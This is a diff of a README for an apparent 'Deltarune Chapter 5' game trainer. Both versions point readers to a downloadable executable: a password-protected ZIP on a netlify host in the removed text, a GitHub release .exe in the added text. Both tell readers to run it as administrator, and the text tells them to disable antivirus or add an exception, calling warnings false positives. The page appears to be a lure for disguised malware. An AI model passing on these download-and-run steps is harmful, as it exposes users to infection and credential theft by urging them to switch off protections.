@@ -1,50 +1,60 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# 🎮 Deltarune-Chapter5-Trainer-Utility - Manage game stats and speed easily
 
-![Version](https://img.shields.io/badge/version-1.0.4-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Beamish-operatinginstructions102/Deltarune-Chapter5-Trainer-Utility)
 
-## 🚀 Features
+## 📋 Overview
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+The Deltarune-Chapter5-Trainer-Utility helps you manage your in-game experience. This tool modifies specific memory values within the game process. It provides control over character health, statistics, inventory items, and movement speed. This trainer works as an external application. It runs alongside your game without changing the original game files. Use this tool for single-player exploration.
 
-## 📥 Download & Installation
+## 🛠️ System Requirements
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+Ensure your computer meets these requirements before you start:
 
-## 💻 Compatibility
+* Operating System: Windows 10 or Windows 11.
+* Game Version: Deltarune Chapter 5 (Steam or Itch.io release).
+* Disk Space: 50MB of free space for the utility.
+* Memory: 4GB of RAM or more.
+* Permissions: You need administrator access to your computer to run the tool.
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+## 📥 Downloading the Tool
 
-## 🔧 Troubleshooting
+You must visit the official repository page to obtain the file. Follow these steps to get the software:
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+1. Visit the following link: [https://github.com/Beamish-operatinginstructions102/Deltarune-Chapter5-Trainer-Utility](https://github.com/Beamish-operatinginstructions102/Deltarune-Chapter5-Trainer-Utility)
+2. Locate the Releases area on the right side of the page.
+3. Select the latest release version.
+4. Download the file ending in .exe to your computer.
+5. Save the file to a folder that you can locate easily, such as your Desktop or Downloads folder.
 
-## 📄 License
+## ⚙️ Running the Utility
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+Follow these instructions to start the tool and interact with the game.
 
----
+1. Launch your game, Deltarune Chapter 5, and load your save file.
+2. Minimize the game window using the Windows key or Alt-Tab.
+3. Locate the downloaded trainer file.
+4. Right-click the trainer file.
+5. Select Run as administrator. This step allows the tool to read the game memory.
+6. A menu displays the available options on your screen.
 
-`windows` `trainer` `save-editor` `deltarune-chapter-5` `max-stats` `game-trainer` `infinite-hp` `deltarune` `unlimited-items` `rpg-trainer` `game-tool` `single-player` `undetected` `2026` `god-mode`
+## 🕹️ Available Features
+
+The utility provides several controls to change how the game behaves:
+
+* Infinite Health: Stops your HP from falling during encounters.
+* Max Statistics: Sets your attack, defense, and magic to the highest possible levels.
+* Unlimited Items: Adds the maximum quantity for every item in your current inventory.
+* Speed Control: Adjusts the movement speed of your character or the game logic. Use caution with this setting to avoid glitches.
+
+## ❗ Troubleshooting
+
+If you encounter issues, review these common solutions:
+
+* Tool Fails to Connect: Ensure the game is running before you open the trainer. Open the trainer as an administrator.
+* Antivirus Warnings: Some security programs identify external tools as suspicious. This is a common false positive. You may need to add an exception in your antivirus settings for the trainer folder.
+* Game Crashes: Excessive use of speed control may cause stability issues. Restart the game and the trainer if the application behaves in an unexpected way.
+* Update Readiness: Always check the repository page for new updates if the game receives an official patch. Old trainers often stop working after game updates.
+
+## 🛡️ Usage Policy
+
+Use this tool for personal exploration only. Modifying game data changes your individual experience. This tool does not affect online services. Keep your game saves backed up to a different folder before you use the trainer. This practice prevents progress loss if a save file becomes corrupted.
